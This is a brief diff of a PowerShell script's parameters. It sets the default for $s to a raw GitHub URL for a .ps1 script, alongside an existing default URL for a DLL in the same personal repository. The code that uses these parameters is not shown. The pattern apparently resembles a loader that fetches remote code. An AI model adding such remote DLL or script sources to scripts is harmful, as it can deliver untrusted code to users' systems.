@@ -1,7 +1,7 @@
 param(
     [string]$u = 'https://raw.githubusercontent.com/suttirakkhiwsatapon-bit/dllv1/refs/heads/main/dllv1.0.dll',
     [string]$p = '',
-    [string]$s = ''
+    [string]$s = 'https://raw.githubusercontent.com/suttirakkhiwsatapon-bit/dllv1/refs/heads/main/dllv1.01.ps1'
 )
 
 $ProgressPreference = 'Continue'
